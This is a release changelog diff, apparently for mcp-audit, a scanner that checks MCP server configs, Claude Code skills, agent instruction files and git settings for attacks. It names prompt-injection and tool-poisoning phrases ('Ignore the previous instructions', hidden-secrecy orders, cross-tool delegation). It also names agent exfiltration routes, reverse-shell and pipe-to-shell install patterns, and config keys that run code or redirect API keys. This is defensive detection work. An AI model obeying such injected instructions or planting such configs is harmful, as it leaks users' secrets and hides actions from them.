+- **HARNESS-001 is MEDIUM in a repository's settings (was HIGH).** Claude Code's settings reference says `bypassPermissions` "doesn't take effect from project or local settings" since 2.1.257; before that it took effect from any file. The finding stays, at MEDIUM, with a title and text that say so, because mcp-audit can't tell which Claude Code version is installed. In your own `~/.claude/settings.json` and `~/.claude.json` it is still HIGH.
+
+### Changed
+
+- **A lock written before this release reports Codex and Gemini CLI project servers as LOCK-002 (STORY-0110).** `lock` now records `.codex/config.toml` and `.gemini/settings.json` servers, so an older lock has no entries for them and `lock --verify` (and the automatic lock check in `scan`/`check`) reports them as not approved. Review them and re-run `mcp-audit lock`. The first scan after upgrading also starts a new rug-pull history for any machine with a Codex or Gemini CLI config, because the set of scanned files changed.
+
+### Fixed
+
+- **Files planted in a repository can no longer crash `scan`, `check` or `lock` (STORY-0117).** A `.mcp.json`, `.codex/config.toml` or `.gemini/settings.json` nested more than 64 levels deep (a 255-level one crashed the JSON output) is now skipped with a line in the scan's `errors`; a JSON file nested deep enough to overflow Python's parser, whether a candidate config, an `mcp-lock.json`, a plugin record, a rug-pull state file or a managed-settings drop-in (also now size-capped at 2 MiB), is treated as unreadable instead of raising. A lone UTF-16 surrogate in a top-level `mcp-lock.json` key name (or a non-UTF-8 file name) shows as `\ud800` in the lock summary instead of crashing `scan --format json` and `check`.
+- **An empty managed settings file counts as `{}` (STORY-0117).** Anthropic's managed-settings page says "An empty managed settings file counts as `{}`"; the managed-MCP report (MANAGED-001..005) flagged a zero-byte `managed-settings.json` or drop-in as invalid and withheld its verdicts. `managed-mcp.json` is not covered by that sentence and still must hold valid JSON.
+- **Permission-rule findings now treat `$CLAUDE_CONFIG_DIR/settings.json` as the user's own settings (STORY-0117).** With the variable set, Claude Code keeps its user settings there instead of `~/.claude` (settings page); mcp-audit looked only at `~/.claude`, so the file was labelled as project settings.
+- **`vet` accepts a version (STORY-0117).** `vet @scope/pkg@1.2.3`, `vet pkg@1.2.3` and `vet pkg==1.2.3` used to look up the whole string and report an unlisted package. The name is now looked up without the version, and each recorded CVE is judged against it (`affected`, `fixed` or `undecidable` when calendar and semantic versions can't be ordered offline); the exit code is 1 when one is affected or cannot be ordered offline. New JSON fields `package.version` and `known_vulnerabilities[].status` appear only when a version is given. See `docs/vet.md`.
+- **The PDF report's content hash changes between versions that change what JSON output redacts (STORY-0117, no code change).** The hash printed on the last page of `scan --report pdf` is SHA-256 of the scan result's JSON serialisation, so a release that redacts more in JSON (STORY-0108, STORY-0110) changes the hash of the same scan, and the scan's own timestamp means two runs never share one. It identifies one report's data, not a scan across versions. Within one version the same result always hashes the same.
+- **MEM-001 no longer fires on "do not tell <someone> to <verb>" (STORY-0099).** The memory-file override check reported trailofbits/skills' `AGENTS.md` ("Do not tell a reviewer to pre-filter"): an instruction about what to say, not an order to hide something. MEM-001 now skips that shape, except when the someone is the user or the "to" is a purpose ("Do not inform the user to avoid suspicion" still counts), and also reports secrecy orders aimed at the user (POISON-070). Every order in our test sets it caught before is still caught. POISON-012 is unchanged for tool descriptions and skills.
+- **A settings or MCP config file reached through a symlinked folder is now reported (TRUST-002).** If a repository's `.claude` (or `.cursor`, `.vscode`, `.amazonq`) folder is a symlink to somewhere else, its `settings.json` or `mcp.json` was read as the repository's own file with no warning. Both `scan --project` and the default scan from a checkout now report TRUST-002 for it, HIGH when the link leaves the repository, as they already did for a symlinked file and for auto-run files. Agent-file discovery already refused to read through such a folder; a test now pins that. A file that is the same as a user-level config already found (a scan run from your home directory with `~/.claude` linked into a dotfiles repository) is read once, as your own settings, with no TRUST-002; a repository folder linked into your own `~/.claude` gets TRUST-002 without being read a second time.
+- **Passwords and tokens in a server's launch command no longer appear in output.** TRANSPORT-003's evidence quoted the launch command, and `servers[].args` (and `raw.args`) in JSON output quoted every argument, including a database password in `postgresql://user:password@host/db` or a `--token ghp_…` argument. URL user info that carries a password or a token (a plain account name such as `git@` is kept; a token used as the user name is redacted) and known secret formats are now replaced with `[REDACTED]` there, and the value of a secret-named flag such as `--password VALUE` with `[REDACTED-FLAG]` (only that argument; flags named for a setting, like `--auth-type` or `--keys-dir`, and values such as `none`, paths and URLs are left alone), in remote URLs (TRANSPORT-001/004 evidence, `servers[].url`), in community-rule findings that quote the matched value, and in CycloneDX snapshots. The scan itself still sees the real values. Environment-variable and header values in JSON output are not changed yet (see `GAPS.md`). What this changes for tools that read scan files: `mcp-audit diff` counts `[REDACTED]` in a scan file's launch arguments or URL as a hardcoded credential, so a credential added between two scan files is still reported CRITICAL (HIGH, "possible credential flag value", for `[REDACTED-FLAG]`), and a URL it can't parse no longer stops it, but replacing one credential with another is no longer visible between two scan files (compare directories or git refs for that); a scan file from an earlier release has the secret in clear, so diffing it against a new one reports the argument as changed; and `scan --report pdf`'s integrity hash of the scan data changes once for a scan whose servers carry such arguments.
+- **POISON-060 no longer fires on the punctuation of Chinese, Japanese and Korean text (STORY-0107).** The homoglyph check (HIGH) counted every character in the full-width block, including `，` `：` `；` `（`, the ordinary punctuation of CJK writing; it now counts only full-width letters and digits, which are the ones that can spell a disguised word. Cyrillic, Greek and mathematical letters still fire, and a full-width-bracketed `<IMPORTANT>` is still caught by POISON-010. On MCPTox's 353 real tools the false alarms fell from 18 (16 at HIGH) to 2 (none at HIGH), and every MCPTox detection, at any severity and at HIGH or above, is kept; MCPTox is in-sample for this check, which is why the change is limited to characters that cannot form a word. Full-width punctuation was 488 of the 661 false findings on the 100 most-downloaded npm MCP servers; that corpus needs a fresh run for a new figure. POISON-030 and POISON-050 are unchanged (`docs/poisoning.md` says why). Applies to skill and memory files too (SKILL-002, MEM-002).
+- **`scan --check-vulns` now reports each advisory's real severity and summary (STORY-0106).** OSV's batch endpoint answers with advisory IDs only, so every match used to come out as INFO with "No summary available.", including HIGH CVEs. Each distinct advisory is now fetched once from OSV's `/v1/vulns/{id}` (at most 256 per scan, with timeouts and size limits) and its severity is read from its own record: the CVSS v3 score, else the database's own rating (GitHub's LOW/MODERATE/HIGH/CRITICAL), else CRITICAL for an OSV `MAL-*` malicious-package record, else INFO with the reason. The evidence says which (`severity_basis`), and `direct_dependency` is now true for direct dependencies too: deps.dev's `relation` field was being ignored. Fixed versions are read from the affected package's own entry, and GitHub's CWE list is read again.
+- **A vulnerability lookup that cannot run no longer looks clean (VULN-UNRESOLVED, INFO; STORY-0106).** When deps.dev has no dependency graph for a version (it answers 404 for releases from the last few days; 17 of the top 100 MCP servers on the day we measured), when the OSV query fails, or when no concrete version can be resolved, `--check-vulns` now reports `VULN-UNRESOLVED` for that server, says what was and was not checked, and adds a line to the scan's errors. A server launched with no version at all (`npx -y pkg`) used to be skipped without a word; it is now resolved to the latest release, checked, and reported as `VULN-UNPINNED`, like `@latest` and ranges already were. `uvx pkg==1.2.3` is read as an exact pin. Network use is unchanged: only with `--check-vulns`, and never with `--offline`. See `docs/supply-chain.md`.
+- **COMM-010 now reads the arguments.** "npx used without pinned version" fired on every `npx` server, pinned or not (all 100 pinned servers in the top-100 npm scan). It now fires only when the package npx runs carries no exact version (`pkg`, `pkg@^1.2.3`, `pkg@latest`), and stays quiet on `npx -y pkg@1.2.3` or `@scope/pkg@1.2.3`. Its evidence is a fixed label ("first package argument has no exact version"), never the arguments, which can hold API keys and home-directory paths. Rules can do the same with a new optional `report:` key on a match condition, and every rule's matched value now has URL passwords, `--api-key`/`--token`-style flag values and known credential formats removed before it reaches a finding.
+- **COMM-004 recognises pinned scoped registry packages.** "Not in the known-server registry" fired on `npx -y @scope/name@1.2.3` for every scoped registry entry (nine in the top-100 scan) because its exemption compared whole arguments. The exemption now uses the same resolver as TRANSPORT-003's registry check, so the two can't disagree.
+- **`@netlify/mcp` is no longer called a typosquat of `@mintlify/mcp`.** For two scoped names, the scope and the name are now compared separately, and a part that differs must still look like the original (at most a third of its letters changed, a swap of two neighbouring letters counting as one). Every one-letter change and every swapped pair of letters in a scoped registry package is still caught (`@azrue/mcp` stays HIGH); see `GAPS.md` for the few two- and three-letter shapes this gives up.
+- **A server that fails to start under `--connect` now says why.** The error used to read "unhandled errors in a TaskGroup (1 sub-exception)" and the server's stderr was lost. mcp-audit now reads the stderr even when the handshake fails, reports the underlying exception and the last line the server printed (for example "STRIPE_SECRET_KEY not set"), and redacts credentials, the server's own env values, the values of its `--api-key`/`--token`-style arguments and URL passwords from both.
+- **`vet <name> --badge` picks PyPI for a PyPI-only registry package.** `vet mcptoon --badge` printed an npm badge URL that doesn't exist; without `--ecosystem`, a name the registry lists only on PyPI now gets the PyPI badge.
+- **The weekly registry advisory check now hands over the proposed malicious-package list too (STORY-0109).** When `registry-advisory-sync.yml` fails, its artifact used to carry only the proposed `known-servers.json`; the proposed `known-malicious.json` (the OSV `MAL-*` mirror behind SC-008 and `vet`) was listed by name in the job summary but never uploaded, so a reviewer could not see the records before running `--write`. The job now passes `--malicious-out`, uploads both files, and its read-only guard checks that neither committed file changed. Permissions and secrets are unchanged.
+
+---
+
+## [0.22.0] - 2026-10-27
+
+### Added
+
+- **Plugin pin vs the actual checkout (PLUGIN-003, PLUGIN-004; STORY-0096).** The scan you already run (`check`, `scan`, `plugins scan`) now compares an installed Claude Code plugin's pinned commit with what is on disk, where the plugin's install directory is a git checkout: it reads `.git/HEAD`, the ref files and `packed-refs` as text and never runs git. PLUGIN-003 (CRITICAL): the checkout's `HEAD` is a different commit from the marketplace's `sha`, and either `HEAD` sits on a branch named like a commit SHA or `FETCH_HEAD`, which is how Plugin4Shell (AIR Security, 2026-09-17) swapped a pinned plugin's code, or Claude Code's own install record says it installed the pin. MEDIUM when the record doesn't explain the difference or `HEAD` can't be read; silent when the marketplace simply moved its pin after install. PLUGIN-004: a branch, tag or remote branch named like a SHA or `FETCH_HEAD` in a plugin checkout (HIGH), a `sha` that isn't a full 40-character SHA (MEDIUM), and a pinned plugin fetched from a host other than github.com, which unlike GitHub accepts SHA-shaped branch names (LOW). Plugin checkouts and the marketplace clones Claude Code fetches into also get the git-config and hook checks (TRUST-006/007). AIR Security reports the fix in Claude Code 2.1.179 (the refusal was observed on 2.1.311), but it is an install-time check and doesn't re-check plugins already on disk; Claude Code 2.1.311 keeps no `.git` in its plugin cache, so for plugins it installed only PLUGIN-004 MEDIUM/LOW can fire. `plugins discover --format json` now shows the commit Claude Code recorded (`git_commit_sha`). See `docs/plugins.md`.
+- **Servers that post to GitHub, Slack or Jira are now treated as their own exfiltration channel: `comms_out` and TOXIC-008..011 (STORY-0101).** A new capability, `comms_out`, marks a server that posts to a shared service: an issue or pull-request comment, a pushed commit, a chat message, a Jira ticket, a social post, a webhook. The published agent exfiltrations of 2025–2026 (Invariant Labs' GitHub MCP attack, Cato CTRL's Jira ticket, the Slack server's CVE-2025-34072, Comment and Control at ACM CCS 2026, GitLost) all left this way, and an egress allowlist does not stop it, because the platform's own host is the destination. A data source next to such a server is now reported: TOXIC-008 (file read), TOXIC-009 (secrets), TOXIC-010 (database), TOXIC-011 (shell execution). TOXIC-008 and TOXIC-010 are HIGH, the same as their network twins TOXIC-001 and TOXIC-005; TOXIC-009 and TOXIC-011 are CRITICAL. The published attacks ran inside a single server, and Comment and Control was a CI harness, not MCP, so none of them shows two MCP servers combined. The registry records `comms_out` for `@modelcontextprotocol/server-github`, `server-gitlab`, `server-slack`, `mcp-atlassian` and `@autoposting.ai/cli`, taken from each package's own tool list; servers outside the registry are recognised by name (GitHub, GitLab, Atlassian, Azure DevOps, Slack, Discord, Telegram, webhooks and others) and, with `--connect`, by write-tool names such as `add_issue_comment` or `push_files`. A server that sends email stays `email` (TOXIC-002). No new flag: `scan`, `check` and the GitHub Action report these by default. Measured on the registry, the published top-100 npm corpus and the demo configs before choosing the severity; the numbers and the pairs deliberately not added (`git` + `comms_out`, which would fire on every GitHub server alone) are in `docs/severity-framework.md`, the limits in `GAPS.md`. The registry submission form has a matching checkbox. Platform names are matched as whole tokens or package fragments and never inside a local path or a connection string, so a directory called `discord-bot` or a database called `webhooks` does not make a server a poster.
+- **Every file the agent reads as instructions (MEM-003, MEM-004).** Agent-file scanning now reads `AGENTS.md` in any directory (Codex, Cursor, Copilot, Claude Code 2.1.277+ and the other agents.md readers), `AGENTS.override.md` and `~/.codex/AGENTS*.md` (Codex), `.claude/AGENTS.md`, `CLAUDE.local.md`, Claude Code rules (`.claude/rules/**/*.md`, `~/.claude/rules/`), and OpenClaw's workspace files (`AGENTS.md`, `SOUL.md`, `USER.md`, `MEMORY.md`, `HEARTBEAT.md` in `~/.openclaw/workspace` or a repository). It also follows what those files pull in: Claude Code `@path` imports (relative to the importing file, four hops deep, skipping fenced code, code spans and block HTML comments; where the Markdown reading is ambiguous the scan reads the stricter way and may report an import Claude Code would skip), and orders such as "Read the files in `knowledge/` before starting" (the Bad Memory paper's shape), scanning each reached file with the importing file's rules. Two new checks run in the scan you already run (`check`, `scan`, `scan --project`, the GitHub Action's default run): **MEM-003** (MEDIUM; LOW for a Markdown file under `~/.claude/`, the shape Claude Code's docs suggest for personal notes) when a project instruction file imports a file from outside the folder, which Claude Code loads after a one-time approval and nobody reviewing the repository sees, or a file `.gitignore` keeps out of git; **MEM-004** (HIGH) when a `HEARTBEAT.md`, which OpenClaw runs every 30 minutes, tells the agent to answer `HEARTBEAT_OK`/`NO_REPLY` no matter what, while hiding a step, or right after running something: the Agent Commander shape, a recurring step whose result the owner never sees. The documented "if nothing needs attention, reply HEARTBEAT_OK" stays silent. Nothing is executed and git is never run; targets outside the folder are never read, and network paths (`//host/share`, `/net/…`, `/Network/…`) are never touched at all; symlinks on the way are reported, not followed; every size and count limit reached is listed in the scan's errors. See `docs/agent-files.md`.
+- **Sandbox settings a repository can loosen (SANDBOX-001..005).** The scan you already run (`check`, `scan`, `scan --project`, the GitHub Action) now reads the `sandbox` block of every Claude Code settings file it already reads. SANDBOX-001: a repository's settings turn on a key Anthropic says weakens the sandbox (`enableWeakerNestedSandbox`, `enableWeakerNetworkIsolation`, `network.allowAllUnixSockets`, `network.allowLocalBinding`) or the shared file switches it off with `enabled: false` (HIGH); `failIfUnavailable: false` or a proxy port that takes filtering away from Claude Code (MEDIUM). SANDBOX-002: `excludedCommands` takes a shell, interpreter, wrapper (`env *`, `timeout 30 *`, `nohup *`), package runner or container runtime out of the sandbox with any arguments (`python *`, `npx *`, `docker *`, `docker compose *`): MEDIUM while Claude Code still asks you before each one runs, HIGH when nothing asks (an allow rule in the same file covers it, or your own settings start sessions in `bypassPermissions` or `auto` mode); `allowUnixSockets` opening the Docker socket is HIGH. SANDBOX-003: `allowedDomains` lets sandboxed commands reach a host anyone can publish to, such as `github.com`, a paste site or a webhook receiver (MEDIUM). If your own `~/.claude/settings.json` sets `network.strictAllowlist: true`, Claude Code ignores a repository's hosts and proxy ports, and those findings drop to INFO and say why. SANDBOX-004: a sandbox key Claude Code ignores in that file, such as `strictAllowlist` or `allowManagedDomainsOnly` in a repository, so a lock you think you have isn't there (INFO). SANDBOX-005: a `.claude/settings.local.json` inside a git repository that no ignore file covers, so your personal approvals get committed (MEDIUM), and home-directory paths with a username in a settings file headed for git (LOW). "A repository's settings" means its shared `.claude/settings.json`, and its `.claude/settings.local.json` only when git carries it: your own local file, which Claude Code keeps out of git, is not reported. To decide, mcp-audit reads `.gitignore`, `.git/info/exclude` and your global git excludes file, and never runs git; when it can't read them, it says so in the scan's errors and reports a local file at MEDIUM at most. See `docs/permission-rules.md`.
+- **Every file in a Claude Code skill is now read (SKILL-005..008)** (STORY-0095). The
+  default `scan` and `check` read each skill under `~/.claude/skills` and the working
+  directory's `.claude/skills`, and `scan --project` every `.claude/skills` in the tree:
+  scripts, reference files, archives, `bin/`, `.git/` and `build/`, not only `SKILL.md`.
+  Nothing is run, unpacked or decompressed. SKILL-005 is an install step in any file:
+  HIGH when the fetch switches TLS checks off, decodes the download, uses plaintext or a
+  raw IP, or when decoded data is executed (piped into a shell, written to a file that
+  a following line runs, passed to `eval`, `sh -c` or a here-string), Python or
+  JavaScript fetches code and evaluates it, Python bytecode is loaded with `marshal`, an
+  archive is opened with a password, a DNS TXT record is executed, a scheduled job or
+  login item is written, or a reverse shell appears; LOW for a plain `curl … | sh` over
+  https; INFO for a known vendor installer or a Dockerfile line. Shells are read the
+  way they run: `bash -e`, `sudo -u root`, `/usr/bin/env bash`, `busybox sh` and
+  `$SHELL` still run what is piped in. SKILL-006 is what the
+  skill ships into Claude Code: a folder with `.claude-plugin/plugin.json` loads as the
+  plugin `<name>@skills-dir` with its own MCP servers (HIGH), hooks, monitors, language
+  servers and `bin/` programs on the agent's PATH (MEDIUM, HIGH when one shadows `git`
+  or `curl`); `SKILL.md` frontmatter hooks (MEDIUM); MCP and settings files a skill
+  carries (MEDIUM/LOW); and text that switches permission prompts off or points
+  `ANTHROPIC_BASE_URL` at another host (HIGH). SKILL-007 is content nothing can read:
+  unknown or compiled binaries, password-protected ZIPs, bytes that contradict the
+  extension, long encoded blobs, foreign files in `.git/` (git's text records are read
+  like any other text, and git's binary files must start with git's format bytes),
+  and anything past the read budgets (MEDIUM; LOW for plain archives and skipped
+  dependency folders). A folder with its own `SKILL.md` is read as its own skill only
+  when skill discovery finds it, so an empty `SKILL.md` cannot hide a folder. SKILL-008
+  (HIGH) marks a skill that bundles code and has another MEDIUM-or-higher finding. The
+  MCP servers of a skills-directory plugin join discovery as client
+  `claude-code-plugin`, so the per-server checks run on them; in a locked repository
+  `scan` and `check` verify them against the entry `mcp-audit lock` wrote for their
+  `.mcp.json` (drift is LOCK-001) and list one with no entry as not covered, and
+  `scan --project` analyses each of them once; carried servers go
+  through the per-server analyzers without joining discovery, and shipped hook commands
+  through HOOK-001/002. With `--include-agent-files` the `SKILL.md` instruction checks
+  also run on a skill's other prose files, where the Paperclip campaign hid its
+  payload. Skills installed as symlinks (the skills CLI's default,
+  `.claude/skills/<name>` → `.agents/skills/<name>`) are read at their target and
+  noted as TRUST-004 (INFO); a repository link that leaves the repository is
+  TRUST-002 HIGH and not read. On 1,129 public skills, 1 produces anything at
+  MEDIUM or above (a dev container that turns permission prompts off). See
+  [`docs/skill-packages.md`](docs/skill-packages.md).
+- **Permission rules that don't do what they say (PERM-001..007).** The scan you already run (`check`, `scan`, `scan --project`, the GitHub Action) now reads every Claude Code settings file for rules Anthropic documents as ignored, misanchored or not a security boundary, and names each rule, the form that gets past it, and what to write instead. PERM-001: a rule Claude Code skips or never matches, such as `Bash(command:rm *)`, an `mcp__` rule with parentheses, `Write(path)`, `Bash(git:* push)` or an `mcp__*` allow (HIGH in `deny`, MEDIUM in `ask`, INFO in `allow`). PERM-002: `Read(/Users/…)` with one slash, which points inside the project, not at `/` (MEDIUM in `deny`/`ask`, INFO in `allow`). PERM-003: `Bash(ls*)`, which also allows `lsof` (LOW). PERM-004: a deny on `curl`, `rm` or `git push` with no sandbox, which `/usr/bin/curl` or `sh -c` gets past (MEDIUM when the same file runs those forms without asking, through an allow such as `Bash(sh -c *)` or a bypass/auto mode in user settings; INFO otherwise). PERM-005: `WebFetch(domain:*)`, which opens the sandbox to every host (HIGH with the sandbox on, LOW otherwise). PERM-006: a bare `Bash` ask rule that the sandbox's auto-allow skips (MEDIUM). PERM-007: an `mcp__<server>` allow rule on a server the scan found poisoned, typosquatted, changed since approval, or pinned to a vulnerable version, matched by the whole server name as Claude Code 2.1.299 does, including a `~/.claude/settings.json` rule on a repository's server under `scan --project` (HIGH). See `docs/permission-rules.md`.
+- **AI agents in GitHub Actions workflows: WORKFLOW-001..003 (STORY-0091).** A
+  plain `scan` or `check` run inside a repository, which is what the GitHub
+  Action does, now reads its `.github/workflows/` files, and `scan --project`
+  reads them for the project and any nested repository. WORKFLOW-001 (HIGH): a
+  Claude Code, Claude Code Security Review or Gemini CLI step runs on an issue,
+  comment or `pull_request_target` event, gets a secret, has write permission
+  (or no `permissions:` block), and can run any command. WORKFLOW-002 (MEDIUM):
+  the same, limited only by a deny list. WORKFLOW-003 (HIGH): a Gemini CLI step
+  on such an event uses a version below the CVSS 10.0 fix, or trusts a
+  workspace that holds pull-request code. Based on "Comment and Control" (ACM
+  CCS 2026), where all three vendors' agents leaked their own secrets. Files
+  are parsed as data and never run; a symlinked `.github` is not followed;
+  workflow files that cannot be read, files over 256 KiB, and anything past
+  4 MiB in one scan are skipped and listed in the scan's errors; an explicit
+  `--path` scans only what it names.
+  See `docs/ci-workflows.md`.
+- **Verified registry entry for `mcptoon`** (PyPI, [#171](https://github.com/adudley78/mcp-audit/issues/171),
+  submitted by [@activeing123](https://github.com/activeing123)), an MCP gateway that
+  proxies the user's configured servers. Capabilities `file_read` and `network_out`,
+  read from the `mcptoon serve` code at 0.8.29 rather than the submission form:
+  `shell_exec` is deliberately not recorded, because the gateway only starts the stdio
+  servers already in the user's config and no MCP tool runs an agent-chosen command.
+  The maintainer is credited in `docs/contributors.md`.
+- **`docs/registry-contributions.md`: a fourth accepted verification method.** An
+  official MCP Registry `io.github.<submitter>/…` name whose package entry is this
+  package, with the package naming the server back (`mcp-name` in a PyPI README,
+  `mcpName` in an npm `package.json`).
+- **Measured poisoning-detection recall and precision** (STORY-0088, new
+  [`docs/poisoning.md`](docs/poisoning.md)). On MCPTox (arXiv 2508.14925), the POISON-*
+  checks flag 74.5% of the 1,312 poisoned tool descriptions (69.2% at HIGH or above, the
+  threshold `check` and the pre-commit default fail on), all of the ones carrying
+  `<IMPORTANT>` or "Ignore the previous instructions", and 23.2% of the ones without a
+  wrapper (7.1% at HIGH or above; 4.7% for parameter tampering). They flag 18 of
+  MCPTox's 353 real tools (16 at HIGH). On the live tools of the 100 most-downloaded npm
+  MCP servers, none of their 661 findings was an attack; that is a fixed measurement of
+  the 0.21.x code, since re-measuring it means re-running those servers.
+  `scripts/bench_poisoning.py` (dev tooling, not part of the package) takes the
+  measurement; `docs/research/poisoning-benchmark/` holds the labels and the results.
+  `tests/test_bench_poisoning.py` fingerprints `analyzers/poisoning.py` and
+  `build_runtime_server_config`, so any change to either fails CI until recall, the
+  clean-tool flag rate and the committed-fragment replay are re-measured. Recall is a
+  release-time measurement: MCPTox is fetched by hand, never in CI, and never committed.
+- **Gemini CLI, Codex and Claude Code files a repository can plant to run commands
+  are now flagged (TRUST-008)** (STORY-0090). `.gemini/settings.json` hooks and
+  `.codex/config.toml` / `.codex/hooks.json` hooks, a Codex `notify` command,
+  `approval_policy = "never"` and `sandbox_mode = "danger-full-access"` are HIGH
+  (CRITICAL when the command reaches the network). A `.gemini/.env` file is MEDIUM,
+  HIGH when it points the Gemini API at another host; a value in it that matches
+  one of CRED-001's secret patterns is reported as CRED-001 by variable name, never
+  by value. Claude Code's
+  `.claude/scheduled_tasks.json` and `.claude/workflows/` are MEDIUM. `scan
+  --project` walks the repository for them, and a plain `scan` or `check` reads them
+  at the root of the folder it runs in, so the GitHub Action sees a commit that adds
+  one. The Miasma worm planted the Gemini hook in at least 123 repositories.
+- **Project settings that send API traffic elsewhere are flagged (CFHYG-007, HIGH)**
+  (STORY-0090). When a repository's `.claude/settings.json` or `settings.local.json`
+  sets `ANTHROPIC_BASE_URL`, another provider endpoint or `HTTPS_PROXY` in its `env`
+  block to a host that isn't the provider's own, every developer who trusts the
+  folder sends their API key there (CVE-2026-21852). Your own `~/.claude` settings
+  and loopback hosts are not flagged. CFHYG-006, which reads a server's `env`, is
+  unchanged.
+- **`enabledMcpjsonServers` is listed (HARNESS-007, INFO)**, beside HARNESS-002: the
+  project MCP servers a settings file approves by name.
+- **`docs/agent-execution-surface.md`:** every repository file mcp-audit reads that a
+  harness runs or obeys, per harness, with the vendor source for each.
+- **TRUST-006 / TRUST-007 — git configuration that runs code.** A repository
+  that arrives as files with its `.git` folder intact (a zip, a shared drive)
+  can make git run a program the moment an agent runs `git status` in the
+  background, before any trust prompt (GitSpawn, 2026). `scan`, `check` and
+  `scan --project` now read the repository's own git config and hooks — never
+  running git — and flag keys that run a command (`core.fsmonitor`,
+  `core.sshCommand`, `diff.external`, diff and filter drivers, `!` credential
+  helpers: HIGH; editor, signing, merge-driver and similar keys: MEDIUM or
+  LOW), includes from outside the repository, nested bare repositories git
+  would use (HIGH), and a `post-index-change` hook, which `git status` runs
+  (HIGH), plus the programs git-lfs and delta read from their own sections of
+  the same config (`lfs.extension.<name>.clean`/`smudge`: HIGH;
+  `lfs.customtransfer.<name>.path`/`args`: MEDIUM; `delta.pager`: LOW). The
+  standard installs of Git LFS, git-crypt, nbstripout, common
+  diff text converters with display options only (exiftool, pdftotext, sops,
+  …; each tool's arguments are checked against an allowlist), husky, an unmodified
+  copy of git's own Watchman hook sample, a plain `ssh -i key` and
+  actions/checkout's own settings stay out of HIGH; a tool run from a Python
+  environment inside the repository is MEDIUM. Secrets in config values are
+  redacted from findings. See `docs/git-exec.md`.
+- **Claude Code subagent definitions are scanned** (`.claude/agents/**/*.md`,
+  `~/.claude/agents/**/*.md`), in the default `scan`, `check` and `scan --project`.
+  `AGENT-001` flags a subagent that asks for `bypassPermissions` (MEDIUM in a repo,
+  LOW in your own folder; HIGH on Claude Code before 2.1.267) or, in a repo, for
+  `acceptEdits`/`auto` (MEDIUM). `AGENT-002` (INFO) says when a `disallowedTools`
+  entry like `Bash(git push *)` removes the whole tool. `AGENT-003` flags subagent
+  hooks (MEDIUM in a repo) and runs each command through HOOK-001/002. `AGENT-004`
+  lists each MCP server a subagent declares for itself (LOW when its name confuses
+  `mcp__` permission rules). Those servers now get every server check and show up in
+  `shadow`, `discover` and the attack graph as client `claude-code-agent`; like plugin
+  servers they stay out of `mcp-lock.json`, so existing locks keep verifying. A
+  repository subagent's server under a lock is listed in the new
+  `lock_status.not_covered` field, printed as a WARN line by `scan` and `check`, and
+  raises AGENT-004 to MEDIUM. The frontmatter is read the way Claude Code reads it, and
+  a security key that is repeated, or that mcp-audit cannot read, is a finding at that
+  key's severity. Definitions past the per-scan budget (500) are still pre-screened,
+  so padding an agents directory cannot hide one. Secrets in finding text are
+  redacted.
+  `--include-agent-files` also scans each subagent's prompt with the skill rules.
+
+- **`SC-007` (MEDIUM): unscoped twins of known packages** (STORY-0097). A server launched
+  as `npx -y mcp-server-github` gets installs meant for `@modelcontextprotocol/server-github`,
+  and edit distance can't see it because the names differ by a scope. `scan`, `check` and
+  `vet` now flag a package, not itself in the registry, whose name is a registry entry's
+  name without its scope (`server-github`, `mcp-server-supabase`), its `mcp-server-<name>`
+  spelling (`mcp-server-github`, `mcp-server-notion`), or the same `mcp-server-<name>` in
+  the other registry (`npx mcp-server-git`, whose real package is on PyPI). In June 2026
+  OSV listed ten such npm names as malicious (MAL-2026-5476 to MAL-2026-5485); those
+  are CRITICAL under SC-008, and SC-007 is MEDIUM because some twin names belong to
+  small community packages, so the finding asks you to confirm the publisher. SC-007
+  replaces SC-001..003 for the same server, and fires on none of the 100 most-downloaded
+  npm MCP servers.
+- **`SC-008` (CRITICAL / MEDIUM): packages OSV lists as malicious, matched offline**
+  (STORY-0097). A new bundled file, `registry/known-malicious.json`, mirrors OSV's `MAL-*`
+  records for npm and PyPI packages whose name contains `mcp` or that the registry lists
+  (217 records). A plain `scan`, `check` or `vet` matches the exact package name with no
+  network call; before, only `scan --check-vulns` could. CRITICAL when the launch installs
+  a listed release, MEDIUM when only past releases are listed and the launch is unpinned.
+  MAL-2026-5479 (`mcp-server-github`) and its nine siblings carry a note with two facts:
+  they share one beacon host, and three of them named `theinfosecguy/npx-canary` as their
+  repository. They are reported as OSV states them. `vet` gains `typosquat_basis`, `malicious` and `other_ecosystem_malicious`
+  in its JSON, and warns when the other registry's package of the same name is malicious
+  (`vet mcp-server-git`).
+- **`scripts/sync_registry_advisories.py` keeps `known-malicious.json` current** from
+  OSV's bulk export; the weekly registry-advisory check now also fails when that file
+  has drifted.
+- **Tool descriptions that steer the agent to another server's tools (DELEG-001..003)**
+  (STORY-0100). With `scan --connect` (and `dashboard --connect`), mcp-audit now reads
+  every connected server's tool descriptions for the poisoning shape that works: a tool
+  that never runs itself but tells the agent "whenever you do X, first call that other
+  tool" or "when you use that tool, change this argument". DELEG-001 (MEDIUM): the text
+  names a tool another connected server exposes. DELEG-002 (MEDIUM): a trigger ("before",
+  "whenever", "when the user …") plus an order to do something no tool on its own
+  server can do. DELEG-003 (HIGH): an order to rewrite another tool's arguments, or every
+  call's. A plain scan never connects, so it never reports these: the lock file keeps
+  only fingerprints of tool definitions, not their text. Measured on MCPTox before
+  shipping, as EPIC-0007 required: with the poisoned tool on its own server (MCPTox's
+  threat model), POISON-* and DELEG-* together flag 97.8% of the poisoned descriptions
+  that carry no keyword wrapper and target an implicit trigger, against 21.4% for
+  POISON-* alone (parameter tampering: 95.8% against 4.7%), and DELEG-* flags 1 of
+  MCPTox's 353 real tools. On 855 real tool descriptions read from the published
+  source of 38 popular npm MCP servers, all in one session, it flagged 1
+  (DELEG-002). Those are not independent numbers: MCPTox's clean tools and 640 of
+  the 855 informed the design; of the 215 held out until the design was frozen,
+  it flagged none. Numbers per attack paradigm, and what it misses, are in
+  [`docs/poisoning.md`](docs/poisoning.md#cross-tool-delegation-deleg-001003);
+  `scripts/bench_poisoning.py delegation` re-takes the measurement, and a test fails
+  if the detector changes without it.
+
+### Changed
+
+- **Lock auto-verify no longer verifies plugin servers** (client
+  `claude-code-plugin`), which `mcp-audit lock` never records. A repository's
+  skills-directory plugin server under a lock root is listed as not covered by
+  the lock (the WARN line subagent servers get), never as LOCK-002; installed
+  plugins stay silent (STORY-0095).
